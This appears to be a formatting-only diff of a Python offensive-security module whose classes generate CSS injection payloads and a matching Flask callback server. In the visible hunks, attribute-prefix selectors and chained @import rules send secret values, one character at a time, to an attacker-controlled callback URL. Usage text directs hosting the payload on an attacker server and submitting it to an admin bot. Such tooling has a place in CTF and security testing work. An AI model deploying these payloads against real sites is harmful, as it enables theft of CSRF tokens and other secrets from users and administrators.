@@ -7,7 +7,6 @@ and sanitizer bypass techniques.
 """
 
 import json
-from typing import Dict, List, Optional
 
 
 class CssInjectionPayloadGenerator:
@@ -139,7 +138,9 @@ class CssInjectionPayloadGenerator:
         lines.append("")
         lines.append("USAGE:")
         lines.append("1. Inject the prefix rules via CSS injection point")
-        lines.append("2. When the admin bot renders the page, the matching rule fires a request")
+        lines.append(
+            "2. When the admin bot renders the page, the matching rule fires a request"
+        )
         lines.append("3. Read the callback to learn the next character")
         lines.append("4. Add the discovered char to 'prefix' and repeat")
         lines.append(f"5. Total rules per round: {len(charset)} (one per charset char)")
@@ -194,7 +195,9 @@ class CssInjectionPayloadGenerator:
         lines.append("NOTES:")
         lines.append("- :host-context() only works inside Shadow DOM stylesheets")
         lines.append("- Useful when CSS injection exists inside a web component")
-        lines.append("- Combine with Declarative Shadow DOM for injection outside components")
+        lines.append(
+            "- Combine with Declarative Shadow DOM for injection outside components"
+        )
         lines.append("- Browser support: Chrome/Edge (not Firefox)")
 
         return "\n".join(lines)
@@ -276,15 +279,15 @@ class CssInjectionPayloadGenerator:
             "    global leaked",
             "    prefix = request.args.get('prefix', '')",
             "    leaked = prefix  # store leaked prefix",
-            f'    charset = "0123456789abcdef"',
+            '    charset = "0123456789abcdef"',
             "    rules = []",
             "    for c in charset:",
             "        test = prefix + c",
-            f'        rules.append(',
+            "        rules.append(",
             f'            f\'{element}[{attribute}^="{{test}}"] {{{{ '
             f'background: url("{callback_url}/leak?prefix={{test}}"); }}}}\' ',
             "        )",
-            f'    rules.append(f\'@import url("{callback_url}/css?step=next&prefix={{prefix}}");\')',
+            f"    rules.append(f'@import url(\"{callback_url}/css?step=next&prefix={{prefix}}\");')",
             "    return '\\n'.join(rules), 200, {'Content-Type': 'text/css'}",
             "",
             "@app.route('/leak')",
@@ -515,8 +518,8 @@ class CssExfiltrationBuilder:
         lines.append("1. Host this HTML on your attacker server")
         lines.append("2. Submit the URL to the admin bot / report endpoint")
         lines.append("3. Monitor your callback server for leaked characters")
-        lines.append(f"4. Update 'known_prefix' with discovered chars and regenerate")
-        lines.append(f"5. Repeat until the full value is exfiltrated")
+        lines.append("4. Update 'known_prefix' with discovered chars and regenerate")
+        lines.append("5. Repeat until the full value is exfiltrated")
 
         return "\n".join(lines)
 
@@ -556,7 +559,7 @@ class CssExfiltrationBuilder:
             "        test = prefix + c",
             f'        rules.append(f\'{target_selector}[{target_attr}^="{{test}}"] {{{{ '
             f'background: url("{callback_url}/leak?p={{test}}"); }}}}\')',
-            f'    rules.append(f\'@import url("{callback_url}/css?prefix={{prefix}}");\')',
+            f"    rules.append(f'@import url(\"{callback_url}/css?prefix={{prefix}}\");')",
             "    css = '\\n'.join(rules)",
             "    return Response(css, mimetype='text/css')",
             "",
